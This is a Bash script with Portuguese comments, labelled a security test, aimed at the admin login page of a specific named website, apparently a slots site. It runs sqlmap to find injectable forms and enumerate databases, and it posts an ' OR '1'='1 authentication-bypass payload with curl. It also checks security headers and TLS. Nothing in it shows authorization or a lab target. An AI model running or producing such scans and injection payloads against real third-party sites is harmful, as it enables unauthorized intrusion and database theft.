#!/bin/bash
# Script de Teste de Segurança usando ferramentas do Kali Linux
# Para formulário de login

BASE_URL="https://www.reidoslotsinais.com"
LOGIN_PATH="/admin/login"
FULL_URL="${BASE_URL}${LOGIN_PATH}"

echo "=========================================="
echo "TESTE DE SEGURANÇA - Kali Linux Tools"
echo "URL: $FULL_URL"
echo "=========================================="

# Verifica se sqlmap está instalado
if command -v sqlmap &> /dev/null; then
    echo -e "\n[*] Testando SQL Injection com SQLMap..."
    sqlmap -u "$FULL_URL" --forms --batch --crawl=0 --level=3 --risk=2 --dbs
else
    echo "[!] SQLMap não encontrado. Instale com: sudo apt install sqlmap"
fi

# Testa com curl
echo -e "\n[*] Testando requisições básicas..."
echo "[*] Verificando headers de segurança..."

curl -I "$FULL_URL" 2>/dev/null | grep -i "x-frame-options\|x-content-type-options\|strict-transport-security\|content-security-policy" || echo "[!] Headers de segurança ausentes"

# Testa SQL Injection básico
echo -e "\n[*] Testando SQL Injection básico..."
curl -X POST "$FULL_URL" \
  -d "username=' OR '1'='1&password=test" \
  -L -v 2>&1 | grep -i "location\|302\|301" && echo "[!] Possível SQL Injection detectado!"

# Verifica SSL/TLS
echo -e "\n[*] Verificando SSL/TLS..."
if command -v sslscan &> /dev/null; then
    sslscan "$BASE_URL" | head -20
else
    echo "[!] SSLScan não encontrado. Instale com: sudo apt install sslscan"
fi

echo -e "\n[*] Testes concluídos!"
